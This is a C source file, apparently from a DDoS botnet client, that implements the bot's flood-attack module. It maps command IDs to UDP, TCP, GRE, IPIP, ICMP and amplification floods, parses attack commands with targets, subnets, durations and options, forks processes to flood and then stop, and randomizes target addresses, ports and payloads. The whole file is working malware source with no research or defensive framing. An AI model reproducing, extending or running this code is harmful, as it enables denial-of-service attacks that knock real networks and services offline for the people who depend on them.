#include <arpa/nameser.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

#include <netinet/in.h>
#include <sys/socket.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/resolver/resolver.h"
#include "bot/utils/bytebuf.h"
#include "bot/utils/xoshiro.h"

// clang-format off
static const flood_func_t FLOOD_FUNCTIONS[] = {
    // l4 udp
    [FLOOD_UDPPLAIN] = flood_udpplain,
    [FLOOD_UDPRAW] = flood_udpraw,
    [FLOOD_UDPAMP] = flood_udpamp,
    [FLOOD_UDPVSE] = flood_udpvse,
    [FLOOD_RAKNET] = flood_udpraknet,

    // l4 tcp
    [FLOOD_TCPSYN] = flood_tcpsyn,
    [FLOOD_TCPACK] = flood_tcpack,
    [FLOOD_TCPTFO] = flood_tcptfo,
    [FLOOD_TCPWRA] = flood_tcpwra,
    [FLOOD_STOMP] = flood_tcpstomp,
    [FLOOD_ACK_STATIC] = flood_tcpack_static, // fucking hate this flood but i cant remove it now can i

    // l3
    [FLOOD_IPIPUDP] = flood_ipipudp,
    [FLOOD_GREIP] = flood_greip,
    [FLOOD_ICMP] = flood_icmpecho,

    // application floods
    [FLOOD_SOCKET] = flood_tcpsocket,


};
// clang-format on

void flood_parse(pbytebuf_t buf) {
  flood_context_t ctx = {0};

  ctx.atk_id = bytebuf_read_uint32(buf);
  ctx.id = bytebuf_read_uint8(buf);
  ctx.duration = bytebuf_read_uint32(buf);
  ctx.num_targs = bytebuf_read_uint8(buf);
  ctx.num_opts = bytebuf_read_uint8(buf);

  // validate targets
  if (ctx.num_targs <= 0) {
    LOG_WARN("Attempted to start a flood with no targets, bailing!");
    return;
  }

  // alloc target count
  ctx.targets = calloc(ctx.num_targs, sizeof(flood_context_t));
  if (!ctx.targets) return;

  for (int i = 0; i < ctx.num_targs; i++) {
    ptarget_t target = &ctx.targets[i];

    target->address = htonl(bytebuf_read_uint32(buf));
    target->netmask = bytebuf_read_uint8(buf);

    memset(&target->saddr, 0, sizeof(struct sockaddr_in));
    target->saddr.sin_family = AF_INET;
    target->saddr.sin_addr.s_addr = target->address;

    LOG_DEBUG("Retrieved target: %s/%d", inet_ntoa(target->saddr.sin_addr), target->netmask);
  }

  if (ctx.num_opts > 0) {
    ctx.options = calloc(ctx.num_opts, sizeof(option_t));
    if (!ctx.options) return;

    for (int i = 0; i < ctx.num_opts; i++) {
      poption_t option = &ctx.options[i];

      option->id = bytebuf_read_uint8(buf);
      option->data = bytebuf_read_bytes(buf, &option->len);

#ifdef DEBUG
      LOG_DEBUG("Parsed option '%d' with length of %d", option->id, option->len);
      for (size_t j = 0; j < option->len; ++j)
        printf("%02x ", option->data[j]);
      printf("\r\n");
#endif
    }

    LOG_DEBUG("Retrieved %d options", ctx.num_opts);
  }

  LOG_INFO("atk_id=%d, id=%d, duration=%d, num_targs=%d, num_opts=%d", ctx.atk_id, ctx.id,
           ctx.duration, ctx.num_targs, ctx.num_opts);

  flood_func_t func = FLOOD_FUNCTIONS[ctx.id];
  if (!func) {
    LOG_ERROR("Flood %d does not exist", ctx.id);
    return;
  }

  pid_t flooder_pid = fork();
  if (flooder_pid == 0) {
    random_init();
    func(&ctx);
    exit(0);
  }

  pid_t stopper_pid = fork();
  if (stopper_pid == 0) {
    PRINTF("Stopping attack in %d seconds! pid=>%d", ctx.duration, flooder_pid);
    sleep(ctx.duration);
    kill(flooder_pid, SIGKILL);
    PRINTF("Stopped attack!");
    exit(0);
  }
}


/**
 * Randomizes target address
 */
void target_random_addr(ptarget_t target) {
  if (target->netmask == 32) return;

  uint32_t netmask_bits = target->netmask;
  uint32_t network_mask_h = 0xFFFFFFFF << (32 - netmask_bits);
  uint32_t network_mask = htonl(network_mask_h);
  uint32_t base_ip = target->saddr.sin_addr.s_addr & network_mask;
  uint32_t host_mask_h = ~network_mask_h;
  uint32_t rand_host_h = xoshiro_next() & host_mask_h;
  uint32_t rand_host = htonl(rand_host_h);
  uint32_t random_ip = base_ip | rand_host;
  target->saddr.sin_addr.s_addr = random_ip;
  target->address = random_ip;
}

/**
 * Randomizes the target port
 */
void target_random_port(ptarget_t target, u16 port) {
  target->saddr.sin_port = htons(port == 0 ? (xoshiro_next() & 0xFFFF) : port);
}

/**
 * Retrieves flood option
 */
poption_t flood_retrieve_opt(pflood_context_t ctx, u8 id) {
  if (!ctx->options || ctx->num_opts == 0) return NULL;

  for (int i = 0; i < ctx->num_opts; i++) {
    if (ctx->options[i].id == id) return &ctx->options[i];
  }

  return NULL;
}

puint8_t flood_retrieve_bytes(pflood_context_t ctx, u8 id, size_t *len) {
  poption_t option = flood_retrieve_opt(ctx, id);
  if (len) *len = option ? option->len : 0;
  return option ? option->data : NULL;
}

u8 flood_retrieve_u8(pflood_context_t ctx, u8 id, u8 def) {
  poption_t option = flood_retrieve_opt(ctx, id);
  return option ? *option->data : def;
}

u16 flood_retrieve_u16(pflood_context_t ctx, u8 id, u16 def) {
  poption_t option = flood_retrieve_opt(ctx, id);
  if (!option || !option->data) {
    return def;
  }

  uint16_t val;
  memcpy(&val, option->data, sizeof(val));
  return ntohs(val);
}

u32 flood_retrieve_u32(pflood_context_t ctx, u8 id, u32 def) {
  poption_t option = flood_retrieve_opt(ctx, id);
  if (!option || !option->data) {
    return def;
  }

  uint32_t val;
  memcpy(&val, option->data, sizeof(val));
  return ntohl(val);
}

uint32_t *flood_retrieve_iplist(pflood_context_t ctx, u8 id, size_t *len_out) {
  if (!ctx) return NULL;

  poption_t option = flood_retrieve_opt(ctx, id);
  if (!option || !option->data || option->len < sizeof(uint16_t)) {
    return NULL;
  }

  pbytebuf_t buffer = bytebuf_new_read(option->data, option->len);
  if (!buffer) return NULL;

  uint32_t ip_count = bytebuf_read_uint32(buffer);
  if (len_out) *len_out = ip_count;

  uint32_t *iplist = calloc(ip_count, sizeof(uint32_t));
  if (!iplist) {
    bytebuf_free(buffer, NULL);
    return NULL;
  }

  for (uint32_t i = 0; i < ip_count; i++) {
    if (bytebuf_remaining(buffer) < sizeof(uint32_t)) {
      free(iplist);
      bytebuf_free(buffer, NULL);
      return NULL;
    }

    iplist[i] = bytebuf_read_uint32(buffer);
  }

  bytebuf_free(buffer, NULL);
  return iplist;
}

pu8 flood_generate(u16 len, u16 min, u16 max, pu8 payload, size_t *out) {
  if (!out) return NULL;

  if (payload)
    *out = len;
  else
    *out = min > 0 && max > 0 ? xoshiro_range(min, max) : len;

  uint8_t *data = malloc(*out);
  if (!data) return NULL;

  if (payload) {
    memcpy(data, payload, *out);
  } else {
    xoshiro_bytes(data, *out);
  }

  return data;
}
